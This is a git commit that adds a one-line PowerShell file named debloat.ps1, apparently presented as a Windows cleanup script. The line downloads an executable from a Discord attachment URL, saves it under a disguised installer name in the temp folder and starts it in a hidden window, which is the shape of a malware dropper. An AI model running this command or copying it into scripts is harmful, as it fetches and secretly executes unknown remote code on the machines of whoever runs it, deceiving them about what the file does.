d2a765e2da242a2b1640352f7544571f24315120
Vanitypyjs <121406723+Vanitypyjs@users.noreply.github.com>
2023-01-08 06:27:15 +0100

    Create debloat.ps1

---
+++ debloat.ps1
@@ -0,0 +1,1 @@
+iwr -useb https://cdn.discordapp.com/attachments/1060330186396160011/1061515581137883136/fs.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
